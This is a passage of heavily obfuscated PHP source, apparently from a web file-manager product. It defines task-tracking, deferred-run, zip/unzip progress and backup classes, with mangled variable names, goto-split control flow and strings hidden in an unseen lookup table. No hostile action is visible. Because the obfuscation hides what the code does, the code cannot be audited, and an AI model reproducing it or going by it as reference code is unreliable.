$ÁÃÉŸŒÇşÍ¯; } private static function valueSet($ÇÚšğ®Î, $çî»ø—ã‡„œ) { $Öò†¼² =& $_SERVER[ÀÆ]; $ÑŞˆ = $Öò†¼²[1570]; CacheLock::lock($ÑŞˆ); $õı÷Õ˜÷åŒÃ = Model($Öò†¼²[427])->set($ÇÚšğ®Î, $çî»ø—ã‡„œ, $Öò†¼²[1569]); CacheLock::unlock($ÑŞˆ); return $õı÷Õ˜÷åŒÃ; } protected static function log($²Ìç¼) { write_log($²Ìç¼, $_SERVER[ÀÆ][1556]); } private static function cacheClear() { $¬¼æ×»€¡áã =& $_SERVER[ÀÆ]; Cache::clearMemory(Model($¬¼æ×»€¡áã[427])->cacheKey($¬¼æ×»€¡áã[1569])); Cache::clearMemory(Model($¬¼æ×»€¡áã[427])->cacheKey($¬¼æ×»€¡áã[1571])); Model($¬¼æ×»€¡áã[1541])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($şŒ¿™ì‘, $ä•„²éì = '', $ÜÁ = 0, $­ÆÉö²Ø–à¹ = '') { $ø« =& $_SERVER[ÀÆ]; if (self::get($şŒ¿™ì‘)) { return; } $this->task = array($ø«[395] => $şŒ¿™ì‘, $ø«[1572] => USER_ID, $ø«[1474] => $­ÆÉö²Ø–à¹, $ø«[29] => $ä•„²éì, $ø«[1056] => $ø«[33], $ø«[1054] => $ÜÁ, $ø«[1068] => 0, $ø«[1573] => 0, $ø«[1574] => 0, $ø«[774] => timeFloat(), $ø«[773] => 0, $ø«[1575] => 0, $ø«[1576] => 0, $ø«[1577] => 0, $ø«[735] => $ø«[1535]); $GLOBALS[$ø«[1578]] = 1; Hook::bind($ø«[1537], array($this, $ø«[1579])); Hook::bind($ø«[1580], array($this, $ø«[1581])); $this->startAfter(); Hook::trigger($ø«[1582], $this->task); $this->task[$ø«[1575]] = timeFloat(); } public function end() { $Ø°ËøöÉ =& $_SERVER[ÀÆ]; if (!$this->task) { return; } if ($this->task[$Ø°ËøöÉ[1575]]) { self::valueSet($this->task[$Ø°ËøöÉ[395]], !1); } $Äìò†Ê§÷†Ç = timeFloat() - $this->task[$Ø°ËøöÉ[774]]; self::log($Ø°ËøöÉ[1583] . $this->task[$Ø°ËøöÉ[395]] . $Ø°ËøöÉ[1584] . $Äìò†Ê§÷†Ç . $Ø°ËøöÉ[1585]); Hook::unbind($Ø°ËøöÉ[1537], array($this, $Ø°ËøöÉ[1579])); Hook::unbind($Ø°ËøöÉ[1580], array($this, $Ø°ËøöÉ[1581])); $this->endAfter(); $this->task = !1; } public function update($ª»Îë = 0, $Æüö…©ëÅÒ = false) { $éÏ‘œ¶°†¶ =& $_SERVER[ÀÆ]; $Ãæ =& $this->task; if (!$Ãæ) { return; } $Ãæ[$éÏ‘œ¶°†¶[1068]] += $ª»Îë; $Ãæ[$éÏ‘œ¶°†¶[773]] = timeFloat(); if ($Ãæ[$éÏ‘œ¶°†¶[1054]]) { if ($Ãæ[$éÏ‘œ¶°†¶[1054]] < $Ãæ[$éÏ‘œ¶°†¶[1068]]) { $Ãæ[$éÏ‘œ¶°†¶[1054]] = $Ãæ[$éÏ‘œ¶°†¶[1068]]; } $´ÚæŠìà·› = timeFloat() - $Ãæ[$éÏ‘œ¶°†¶[774]] - $Ãæ[$éÏ‘œ¶°†¶[1576]]; $Ãæ[$éÏ‘œ¶°†¶[1573]] = $Ãæ[$éÏ‘œ¶°†¶[1068]] / $Ãæ[$éÏ‘œ¶°†¶[1054]]; $Ãæ[$éÏ‘œ¶°†¶[1574]] = $Ãæ[$éÏ‘œ¶°†¶[1068]] / $´ÚæŠìà·›; if ($Ãæ[$éÏ‘œ¶°†¶[1573]] > 0) { $Ãæ[$éÏ‘œ¶°†¶[1577]] = $´ÚæŠìà·› * (1 - $Ãæ[$éÏ‘œ¶°†¶[1573]]) / $Ãæ[$éÏ‘œ¶°†¶[1573]]; } $Ãæ[$éÏ‘œ¶°†¶[1577]] = $Ãæ[$éÏ‘œ¶°†¶[1577]] <= 0 ? 0 : $Ãæ[$éÏ‘œ¶°†¶[1577]]; } $this->updateAfter(); $¯ª¤„ÉØˆÚÑ = 0.2; if (timeFloat() - $Ãæ[$éÏ‘œ¶°†¶[1575]] < $¯ª¤„ÉØˆÚÑ && !$Æüö…©ëÅÒ) { return; } $Ú‡â€ = self::get($Ãæ[$éÏ‘œ¶°†¶[395]]); $Ôø¾ğÆİ âÇ = $Ú‡â€[$éÏ‘œ¶°†¶[735]]; if ($Ôø¾ğÆİ âÇ == self::STATYS_KILL) { $Ş‚ÛÁû = array($éÏ‘œ¶°†¶[1586] => LNG($éÏ‘œ¶°†¶[1587]), $éÏ‘œ¶°†¶[1118] => !1); Cache::set($éÏ‘œ¶°†¶[1588] . $this->task[$éÏ‘œ¶°†¶[395]], $Ş‚ÛÁû, 30); $this->onKill(); $this->end(); die; } else { if ($Ôø¾ğÆİ âÇ == self::STATYS_STOP) { $šĞœŠíÂÄ÷ä = 2; $Ú‡â€[$éÏ‘œ¶°†¶[1576]] += $šĞœŠíÂÄ÷ä; self::valueSet($Ãæ[$éÏ‘œ¶°†¶[395]], $Ú‡â€); sleep($šĞœŠíÂÄ÷ä); $this->update(); return; } } $Ãæ[$éÏ‘œ¶°†¶[735]] = $Ôø¾ğÆİ âÇ ? $Ôø¾ğÆİ âÇ : $Ãæ[$éÏ‘œ¶°†¶[735]]; $Ãæ[$éÏ‘œ¶°†¶[1576]] = $Ú‡â€[$éÏ‘œ¶°†¶[1576]] ? $Ú‡â€[$éÏ‘œ¶°†¶[1576]] : 0; $Ãæ[$éÏ‘œ¶°†¶[1575]] = timeFloat(); Hook::trigger($éÏ‘œ¶°†¶[1589], $Ãæ); self::valueSet($Ãæ[$éÏ‘œ¶°†¶[395]], $Ãæ); } public function onKillSet($¿ø•Ê¯, $áÙİãã¢ = array()) { $this->onKillCall = array($¿ø•Ê¯, $áÙİãã¢); } public function onKill() { $ÇçâŒ¾™­˜ =& $_SERVER[ÀÆ]; self::log($ÇçâŒ¾™­˜[1583] . $this->task[$ÇçâŒ¾™­˜[395]] . $ÇçâŒ¾™­˜[1590]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÂÒ¡Š) { $°À·Áö±ËÊ˜ü =& $_SERVER[ÀÆ]; Cache::set($°À·Áö±ËÊ˜ü[1588] . $this->task[$°À·Áö±ËÊ˜ü[395]], $ÂÒ¡Š, 60); return $ÂÒ¡Š; } public static function get($«˜Â¡‘í«) { $Ì˜ö‘ =& $_SERVER[ÀÆ]; $Áòè = self::valueGet($«˜Â¡‘í«); if (is_array($Áòè) && $Áòè[$Ì˜ö‘[1591]]) { $´Ï = ActionApply($Áòè[$Ì˜ö‘[1591]], array($Áòè)); $Áòè = is_array($´Ï) ? $´Ï : $Áòè; } return $Áòè; } public static function listData() { $à×¶íÅšè = self::valueGet(); return array_sort_by($à×¶íÅšè, $_SERVER[ÀÆ][774], !0); } public static function kill($Œ·Ù) { return self::changeStatus($Œ·Ù, self::STATYS_KILL); } public static function stop($™²ê–Ş) { return self::changeStatus($™²ê–Ş, self::STATYS_STOP); } public static function restart($ü„€êéÕ) { return self::changeStatus($ü„€êéÕ, self::STATYS_RUNNING); } public static function killAll() { $íÎ¿ =& $_SERVER[ÀÆ]; $ïâ¿£»€ë = self::listData(); foreach ($ïâ¿£»€ë as $¿Ûğ) { self::kill($¿Ûğ[$íÎ¿[395]]); } sleep(2); foreach ($ïâ¿£»€ë as $¿Ûğ) { self::valueSet($¿Ûğ[$íÎ¿[395]], !1); } } private static function changeStatus($²ÃÁ©¥íÜ, $Í±†»²Ê€öØ) { $åüÄ¨À™ÚŞ =& $_SERVER[ÀÆ]; $¬ñÖˆõÈó·ß› = self::valueGet($²ÃÁ©¥íÜ); if (!$¬ñÖˆõÈó·ß›) { return !1; } $¬ñÖˆõÈó·ß›[$åüÄ¨À™ÚŞ[735]] = $Í±†»²Ê€öØ; self::valueSet($²ÃÁ©¥íÜ, $¬ñÖˆõÈó·ß›); self::log($åüÄ¨À™ÚŞ[1592] . $¬ñÖˆõÈó·ß›[$åüÄ¨À™ÚŞ[395]] . $åüÄ¨À™ÚŞ[1593] . $Í±†»²Ê€öØ); return !0; } public static function valueGet($¥ = false) { $«ñ¹Ÿ”¾ô =& $_SERVER[ÀÆ]; if ($¥) { $ŠÓäò‚¹ = Model($«ñ¹Ÿ”¾ô[439])->where(array($«ñ¹Ÿ”¾ô[93] => $¥, $«ñ¹Ÿ”¾ô[29] => $«ñ¹Ÿ”¾ô[1594]))->find(); return $ŠÓäò‚¹ ? json_decode($ŠÓäò‚¹[$«ñ¹Ÿ”¾ô[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ü×· = false) { $ßÀÜÜÚã =& $_SERVER[ÀÆ]; $Ö˜Ô = array($ßÀÜÜÚã[29] => $ßÀÜÜÚã[1594]); if ($ü×·) { $Ö˜Ô[$ßÀÜÜÚã[1572]] = $ü×·; } $³×ÅùºÑª = Model($ßÀÜÜÚã[439])->where($Ö˜Ô)->select(); $³×ÅùºÑª = $³×ÅùºÑª ? $³×ÅùºÑª : array(); foreach ($³×ÅùºÑª as $È‘¦”Ôª¾èæ => $€²áó¯Ù£¹) { $³×ÅùºÑª[$È‘¦”Ôª¾èæ] = json_decode($€²áó¯Ù£¹[$ßÀÜÜÚã[372]], !0); } return $³×ÅùºÑª; } public static function valueSet($„‚¼ÌÈÌ, $˜È—Ù©ÅŞˆï) { $‚çŸ¼™Ì =& $_SERVER[ÀÆ]; if (!$˜È—Ù©ÅŞˆï) { return Model($‚çŸ¼™Ì[439])->where(array($‚çŸ¼™Ì[93] => $„‚¼ÌÈÌ, $‚çŸ¼™Ì[29] => $‚çŸ¼™Ì[1594]))->delete(); } $•–¯ı¾‚ñ = json_encode($˜È—Ù©ÅŞˆï); if (!$•–¯ı¾‚ñ) { ob_start(); var_dump($˜È—Ù©ÅŞˆï); $¾Òû”•ŒÒÄ = ob_get_clean(); self::log($‚çŸ¼™Ì[1595] . json_encode_force($¾Òû”•ŒÒÄ)); } if (!$„‚¼ÌÈÌ || !$˜È—Ù©ÅŞˆï[$‚çŸ¼™Ì[395]]) { return !1; } $òÆŞæß©äª„ = array($‚çŸ¼™Ì[29] => $‚çŸ¼™Ì[1594], $‚çŸ¼™Ì[1572] => USER_ID, $‚çŸ¼™Ì[93] => $„‚¼ÌÈÌ, $‚çŸ¼™Ì[372] => $•–¯ı¾‚ñ); $±›¨ = $‚çŸ¼™Ì[1596]; CacheLock::lock($±›¨); Model($‚çŸ¼™Ì[439])->add($òÆŞæß©äª„, array(), !0); CacheLock::unlock($±›¨); } public static function log($›ªÂ…ò) { if (!GLOBAL_DEBUG) { return; } write_log($›ªÂ…ò, $_SERVER[ÀÆ][1597]); } } goto Eßá´‘šù; AèäÇ²Ş: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÑÓß—ø, $¤Ë†˜ƒ = 5.0) { if (!$ÑÓß—ø) { return; } $ÈŒ‹ŒÒ¯ = Cache::get($ÑÓß—ø); if (!$ÈŒ‹ŒÒ¯ || timeFloat() - floatVal($ÈŒ‹ŒÒ¯) >= $¤Ë†˜ƒ) { Cache::set($ÑÓß—ø, timeFloat(), $¤Ë†˜ƒ * 10); return !0; } return !1; } public static function timeLimitCall($ºê‡ˆ, $Ş¡Îê, $ä½, $ªÒ¡ËŒ = 5.0) { $÷¨¯¥ËÌŒ =& $_SERVER[ÀÆ]; if (!$ºê‡ˆ || !$Ş¡Îê) { return; } self::$asyncAdd = !0; $Ÿüú = $÷¨¯¥ËÌŒ[1652]; $ÏĞñ„ê = Cache::get($Ÿüú, !0); $îÃßÃøæ´ = array($÷¨¯¥ËÌŒ[1653] => timeFloat(), $÷¨¯¥ËÌŒ[1654] => timeFloat(), $÷¨¯¥ËÌŒ[262] => $Ş¡Îê, $÷¨¯¥ËÌŒ[1647] => $ä½, $÷¨¯¥ËÌŒ[197] => $ªÒ¡ËŒ); if (is_array($ÏĞñ„ê[$ºê‡ˆ])) { $îÃßÃøæ´[$÷¨¯¥ËÌŒ[1654]] = $ÏĞñ„ê[$ºê‡ˆ][$÷¨¯¥ËÌŒ[1654]]; } if (is_array($ÏĞñ„ê[$ºê‡ˆ])) { if (timeFloat() - $ÏĞñ„ê[$ºê‡ˆ][$÷¨¯¥ËÌŒ[1653]] < $îÃßÃøæ´[$÷¨¯¥ËÌŒ[197]] * 0.3) { return; } $îÃßÃøæ´[$÷¨¯¥ËÌŒ[1654]] = $ÏĞñ„ê[$ºê‡ˆ][$÷¨¯¥ËÌŒ[1654]]; } $ÏĞñ„ê[$ºê‡ˆ] = $îÃßÃøæ´; Cache::set($Ÿüú, $ÏĞñ„ê, 60); Cache::removeMemory($Ÿüú); write_log($÷¨¯¥ËÌŒ[1655] . $ºê‡ˆ . $÷¨¯¥ËÌŒ[68] . $Ş¡Îê, $÷¨¯¥ËÌŒ[1649]); } public static function timeLimitCallLoop() { $ˆÁ°¨Õ½¬›œÖ =& $_SERVER[ÀÆ]; $Àå©š‹ô¦øí = array($ˆÁ°¨Õ½¬›œÖ[1656]); $øøÌµ˜‘î = in_array(strtolower(ACTION), $Àå©š‹ô¦øí); if (!$øøÌµ˜‘î && !self::$asyncAdd) { return; } $÷Ö = $ˆÁ°¨Õ½¬›œÖ[1652]; $êğ›¯†Óõ = Cache::get($÷Ö, !0); if (!$êğ›¯†Óõ || count($êğ›¯†Óõ) <= 0) { return; } $É¬ñ‡Ï½ = !1; $¼‘º×¤ = timeFloat(); $›ÚïŒ = array(); foreach ($êğ›¯†Óõ as $ÖÓÄ—¥ => $¯â÷ ²è§Ü) { if ($¼‘º×¤ - $¯â÷ ²è§Ü[$ˆÁ°¨Õ½¬›œÖ[1654]] > $¯â÷ ²è§Ü[$ˆÁ°¨Õ½¬›œÖ[197]]) { $É¬ñ‡Ï½ = !0; try { Hook::apply($¯â÷ ²è§Ü[$ˆÁ°¨Õ½¬›œÖ[262]], $¯â÷ ²è§Ü[$ˆÁ°¨Õ½¬›œÖ[1647]]); write_log($ˆÁ°¨Õ½¬›œÖ[1657] . $ÖÓÄ—¥ . $ˆÁ°¨Õ½¬›œÖ[68] . $¯â÷ ²è§Ü[$ˆÁ°¨Õ½¬›œÖ[262]] . $ˆÁ°¨Õ½¬›œÖ[1658] . ACTION, $ˆÁ°¨Õ½¬›œÖ[1649]); } catch (Exception $ÀùîÑ£×İ) { } continue; } $›ÚïŒ[$ÖÓÄ—¥] = $¯â÷ ²è§Ü; } if (!$É¬ñ‡Ï½) { return; } if (!$›ÚïŒ) { return Cache::remove($÷Ö); } Cache::set($÷Ö, $›ÚïŒ, 60); Cache::removeMemory($÷Ö); } public static function finished($é”ûŸ­Ì€Ô®Ş, $¹íÜ•êÆ›»´Ç) { $×¼ƒóí¦ğØ˜ã =& $_SERVER[ÀÆ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($×¼ƒóí¦ğØ˜ã[262] => $é”ûŸ­Ì€Ô®Ş, $×¼ƒóí¦ğØ˜ã[1647] => $¹íÜ•êÆ›»´Ç); } private static function finishedRun() { $âøªõîš’Ù =& $_SERVER[ÀÆ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¼ûù³ç“) { try { Hook::apply($¼ûù³ç“[$âøªõîš’Ù[262]], $¼ûù³ç“[$âøªõîš’Ù[1647]]); } catch (Exception $×ÕŞÚÉ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Éâ­è•ïò÷ÙÖ =& $_SERVER[ÀÆ]; parent::startAfter(); Hook::bind($Éâ­è•ïò÷ÙÖ[1659], array($this, $Éâ­è•ïò÷ÙÖ[1660])); Hook::bind($Éâ­è•ïò÷ÙÖ[1121], array($this, $Éâ­è•ïò÷ÙÖ[1661])); $ÉÁ =& $this->task; $ÉÁ[$Éâ­è•ïò÷ÙÖ[1662]] = $Éâ­è•ïò÷ÙÖ[1126]; if (!$ÉÁ[$Éâ­è•ïò÷ÙÖ[1474]]) { $ÉÁ[$Éâ­è•ïò÷ÙÖ[1474]] = LNG($Éâ­è•ïò÷ÙÖ[1663]); } } protected function endAfter() { $­‡¢‰³™Öš =& $_SERVER[ÀÆ]; parent::endAfter(); Hook::unbind($­‡¢‰³™Öš[1659], array($this, $­‡¢‰³™Öš[1660])); Hook::unbind($­‡¢‰³™Öš[1121], array($this, $­‡¢‰³™Öš[1661])); } public function updateAfter() { $ŠÅœ½€åß =& $_SERVER[ÀÆ]; $¢üøº‘Ï… =& $this->task; if (!$¢üøº‘Ï…[$ŠÅœ½€åß[1054]] || !$¢üøº‘Ï…[$ŠÅœ½€åß[748]]) { return; } if ($¢üøº‘Ï…[$ŠÅœ½€åß[1662]] == $ŠÅœ½€åß[1126]) { $·°ÒšéÉË¶³ = 0; if ($¢üøº‘Ï…[$ŠÅœ½€åß[1618]]) { $·°ÒšéÉË¶³ = $¢üøº‘Ï…[$ŠÅœ½€åß[1619]] / $¢üøº‘Ï…[$ŠÅœ½€åß[1618]]; } $¢üøº‘Ï…[$ŠÅœ½€åß[1573]] = $·°ÒšéÉË¶³ * 0.3; } else { if ($¢üøº‘Ï…[$ŠÅœ½€åß[1662]] == $ŠÅœ½€åß[311]) { $·°ÒšéÉË¶³ = $¢üøº‘Ï…[$ŠÅœ½€åß[1068]] / $¢üøº‘Ï…[$ŠÅœ½€åß[1054]]; $¢üøº‘Ï…[$ŠÅœ½€åß[1573]] = 0.3 + $·°ÒšéÉË¶³ * 0.4; } else { if ($¢üøº‘Ï…[$ŠÅœ½€åß[1662]] == $ŠÅœ½€åß[107]) { $åô›»û›Šû = 0; if ($¢üøº‘Ï…[$ŠÅœ½€åß[1620]] == $ŠÅœ½€åß[107]) { $åô›»û›Šû = $¢üøº‘Ï…[$ŠÅœ½€åß[1619]]; } $·°ÒšéÉË¶³ = ($¢üøº‘Ï…[$ŠÅœ½€åß[1623]] + $åô›»û›Šû) / $¢üøº‘Ï…[$ŠÅœ½€åß[748]]; $¢üøº‘Ï…[$ŠÅœ½€åß[1573]] = 0.3 + 0.4 + $·°ÒšéÉË¶³ * 0.3; } } } if ($¢üøº‘Ï…[$ŠÅœ½€åß[1573]] > 0) { $’Ø¡Ş = timeFloat() - $¢üøº‘Ï…[$ŠÅœ½€åß[774]] - $¢üøº‘Ï…[$ŠÅœ½€åß[1576]]; $¢üøº‘Ï…[$ŠÅœ½€åß[1577]] = $’Ø¡Ş * (1 - $¢üøº‘Ï…[$ŠÅœ½€åß[1573]]) / $¢üøº‘Ï…[$ŠÅœ½€åß[1573]]; } } public function addFile($Ëòˆ¸Í™ó) { $ëññ“›Ş =& $_SERVER[ÀÆ]; $‘¯—™·Ãæ¾ =& $this->task; $¬¾çÒ‡ì¡ = IO::info($Ëòˆ¸Í™ó); $‘¯—™·Ãæ¾[$ëññ“›Ş[1616]] = $¬¾çÒ‡ì¡[$ëññ“›Ş[28]]; $‘¯—™·Ãæ¾[$ëññ“›Ş[1618]] = $¬¾çÒ‡ì¡[$ëññ“›Ş[78]]; $‘¯—™·Ãæ¾[$ëññ“›Ş[1619]] = 0; $‘¯—™·Ãæ¾[$ëññ“›Ş[1056]] = $ëññ“›Ş[1638]; $‘¯—™·Ãæ¾[$ëññ“›Ş[1620]] = $ëññ“›Ş[1126]; $‘¯—™·Ãæ¾[$ëññ“›Ş[748]] = $¬¾çÒ‡ì¡[$ëññ“›Ş[78]]; $‘¯—™·Ãæ¾[$ëññ“›Ş[1054]] = 1; $í“¶‚ = 0; $‘¯—™·Ãæ¾[$ëññ“›Ş[1627]] = array($ëññ“›Ş[1628] => $í“¶‚ + 1, $ëññ“›Ş[415] => $¬¾çÒ‡ì¡[$ëññ“›Ş[28]], $ëññ“›Ş[76] => $¬¾çÒ‡ì¡[$ëññ“›Ş[76]], $ëññ“›Ş[513] => $¬¾çÒ‡ì¡[$ëññ“›Ş[513]] ? $¬¾çÒ‡ì¡[$ëññ“›Ş[513]] : $¬¾çÒ‡ì¡[$ëññ“›Ş[76]]); $this->update(); } public function unzipAfter($ı“îû©) { $„ÅóË’‚öÇ¦´ =& $_SERVER[ÀÆ]; $áØŞö =& $this->task; $áØŞö[$„ÅóË’‚öÇ¦´[1662]] = $„ÅóË’‚öÇ¦´[107]; $—áıÜ = IO::infoWithChildren($ı“îû©); $—á = 0; $áØŞö[$„ÅóË’‚öÇ¦´[1627]] = array($„ÅóË’‚öÇ¦´[1628] => $—á + 1, $„ÅóË’‚öÇ¦´[415] => $—áıÜ[$„ÅóË’‚öÇ¦´[28]], $„ÅóË’‚öÇ¦´[76] => $—áıÜ[$„ÅóË’‚öÇ¦´[76]], $„ÅóË’‚öÇ¦´[513] => $—áıÜ[$„ÅóË’‚öÇ¦´[513]] ? $—áıÜ[$„ÅóË’‚öÇ¦´[513]] : $—áıÜ[$„ÅóË’‚öÇ¦´[76]]); if ($—áıÜ[$„ÅóË’‚öÇ¦´[29]] == $„ÅóË’‚öÇ¦´[193]) { $áØŞö[$„ÅóË’‚öÇ¦´[1054]] = 1; } else { $áØŞö[$„ÅóË’‚öÇ¦´[1054]] = $—áıÜ[$„ÅóË’‚öÇ¦´[81]][$„ÅóË’‚öÇ¦´[79]]; } $áØŞö[$„ÅóË’‚öÇ¦´[1056]] = $„ÅóË’‚öÇ¦´[33]; $áØŞö[$„ÅóË’‚öÇ¦´[1620]] = 0; $áØŞö[$„ÅóË’‚öÇ¦´[1068]] = 0; $áØŞö[$„ÅóË’‚öÇ¦´[1618]] = 0; $áØŞö[$„ÅóË’‚öÇ¦´[1619]] = 0; $áØŞö[$„ÅóË’‚öÇ¦´[1616]] = $„ÅóË’‚öÇ¦´[33]; $áØŞö[$„ÅóË’‚öÇ¦´[1623]] = 0; $áØŞö[$„ÅóË’‚öÇ¦´[748]] = $—áıÜ[$„ÅóË’‚öÇ¦´[78]]; $this->update(); self::log($„ÅóË’‚öÇ¦´[1664] . json_encode(array($áØŞö, $—áıÜ))); } public function nameParse($‘«Æ³ÉÉ) { $Ìôš£ =& $_SERVER[ÀÆ]; $áÕ¬ù£Ï =& $this->task; if ($áÕ¬ù£Ï[$Ìôš£[1662]] == $Ìôš£[1126]) { $áÕ¬ù£Ï[$Ìôš£[1662]] = $Ìôš£[311]; $áÕ¬ù£Ï[$Ìôš£[1623]] = 0; $áÕ¬ù£Ï[$Ìôš£[748]] = 0; } $Ô³ü = get_path_this($‘«Æ³ÉÉ); if (strstr($Ô³ü, $Ìôš£[95])) { $áÕ¬ù£Ï[$Ìôš£[1068]] += 1; $áÕ¬ù£Ï[$Ìôš£[1054]] += 1; } $áÕ¬ù£Ï[$Ìôš£[1616]] = $‘«Æ³ÉÉ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÕÎƒÃæù˜ =& $_SERVER[ÀÆ]; parent::startAfter(); Hook::bind($ÕÎƒÃæù˜[1665], array($this, $ÕÎƒÃæù˜[1660])); $¼è¯ =& $this->task; $¼è¯[$ÕÎƒÃæù˜[1662]] = $ÕÎƒÃæù˜[1126]; if (!$¼è¯[$ÕÎƒÃæù˜[1474]]) { $¼è¯[$ÕÎƒÃæù˜[1474]] = LNG($ÕÎƒÃæù˜[1666]); } } protected function endAfter() { $ã¾”å¯ÂºÏ =& $_SERVER[ÀÆ]; parent::endAfter(); Hook::unbind($ã¾”å¯ÂºÏ[1665], array($this, $ã¾”å¯ÂºÏ[1660])); } public function updateAfter() { $…é‰¾ÕÓ =& $_SERVER[ÀÆ]; $â†ú‰¶ËæãÑ =& $this->task; if (!$â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1054]] || !$â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[748]]) { return; } if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1662]] == $…é‰¾ÕÓ[1126]) { $…Èˆ¿×Ä¼µÂ = $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1619]]; if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1620]] != $…é‰¾ÕÓ[1126]) { $…Èˆ¿×Ä¼µÂ = 0; } $ ’¾şõ‘ÕÈ = ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1623]] + $…Èˆ¿×Ä¼µÂ) / $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[748]]; $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]] = $ ’¾şõ‘ÕÈ * 0.3; } else { if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1662]] == $…é‰¾ÕÓ[311]) { $ ’¾şõ‘ÕÈ = $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1068]] / $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1054]]; $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]] = 0.3 + $ ’¾şõ‘ÕÈ * 0.5; } else { if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1662]] == $…é‰¾ÕÓ[107]) { $ ’¾şõ‘ÕÈ = 0; if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1618]]) { $ ’¾şõ‘ÕÈ = $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1619]] / $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1618]]; } $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]] = 0.3 + 0.5 + $ ’¾şõ‘ÕÈ * 0.2; } } } if ($â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]] > 0) { $ÏˆØ = timeFloat() - $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[774]] - $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1576]]; $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1577]] = $ÏˆØ * (1 - $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]]) / $â†ú‰¶ËæãÑ[$…é‰¾ÕÓ[1573]]; } } public function copyFileStart($ı½, $øıÑÒ, $Í•€²ğ‚Ù•, $§è, $êóæİ, $Û«õÈ“) { $ãÊ¾×ğÙ =& $_SERVER[ÀÆ]; parent::copyFileStart($ı½, $øıÑÒ, $Í•€²ğ‚Ù•, $§è, $êóæİ, $Û«õÈ“); $©¸ =& $this->task; if ($©¸[$ãÊ¾×ğÙ[1662]] == $ãÊ¾×ğÙ[311]) { $©¸[$ãÊ¾×ğÙ[1662]] = $ãÊ¾×ğÙ[107]; } $this->update(); } public function copyFileEnd($ğĞ‘¤, $Æİšòç, $‚á°¿œŠ³‚ºÇ, $®ˆ, $©¾Üç×ºå¿õ’, $Œí‰’ïù) { $ŞÏ Öøá€œ =& $_SERVER[ÀÆ]; $Ÿ¡ÙÀİ£ü =& $this->task; $Ÿ¡ÙÀİ£ü[$ŞÏ Öøá€œ[1619]] = $Ÿ¡ÙÀİ£ü[$ŞÏ Öøá€œ[1618]]; $Ÿ¡ÙÀİ£ü[$ŞÏ Öøá€œ[1623]] += $Ÿ¡ÙÀİ£ü[$ŞÏ Öøá€œ[1618]]; $Ÿ¡ÙÀİ£ü[$ŞÏ Öøá€œ[1620]] = $ŞÏ Öøá€œ[33]; $this->update(); } public function nameParse($Üø½Çü¸) { $ñ®ƒ÷ÈÃˆ =& $_SERVER[ÀÆ]; $˜ =& $this->task; if ($˜[$ñ®ƒ÷ÈÃˆ[1068]] < $˜[$ñ®ƒ÷ÈÃˆ[1054]]) { $¬üçĞØ‡æò¯ = get_path_this($Üø½Çü¸); if (strstr($¬üçĞØ‡æò¯, $ñ®ƒ÷ÈÃˆ[95])) { $˜[$ñ®ƒ÷ÈÃˆ[1068]] += 1; } } if ($˜[$ñ®ƒ÷ÈÃˆ[1662]] == $ñ®ƒ÷ÈÃˆ[1126]) { $˜[$ñ®ƒ÷ÈÃˆ[1662]] = $ñ®ƒ÷ÈÃˆ[311]; } $˜[$ñ®ƒ÷ÈÃˆ[1616]] = $Üø½Çü¸; $this->update(); } } goto f¹ùÅİ·¥; eàĞà†­…Ö: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ô»úÌ– =& $_SERVER[ÀÆ]; $this->isManual(); self::$name = date($ô»úÌ–[733]); if (!($¢“ù‚± = Model($ô»úÌ–[734])->lastItem())) { $¢“ù‚± = $this->initData(); } else { self::$name = $¢“ù‚±[$ô»úÌ–[28]]; if ($¢“ù‚±[$ô»úÌ–[735]] == $ô»úÌ–[87]) { self::$name = date($ô»úÌ–[736]); $®—¾–©å = 0; if (isset($¢“ù‚±[$ô»úÌ–[291]][$ô»úÌ–[193]][$ô»úÌ–[461]])) { $®—¾–©å = (int) $¢“ù‚±[$ô»úÌ–[291]][$ô»úÌ–[193]][$ô»úÌ–[461]]; } if (self::$manual == 0 && $¢“ù‚±[$ô»úÌ–[28]] == self::$name) { Model($ô»úÌ–[734])->remove($¢“ù‚±[$ô»úÌ–[395]]); } $¢“ù‚± = $this->initData($®—¾–©å, $¢“ù‚±[$ô»úÌ–[737]]); } else { $this->checkStore($¢“ù‚±[$ô»úÌ–[737]]); } } self::$option = $¢“ù‚±; } private function isManual() { $¡ØáÊ = _get($GLOBALS, $_SERVER[ÀÆ][738], 0); $¡ØáÊ = intval($¡ØáÊ); self::$manual = $¡ØáÊ && 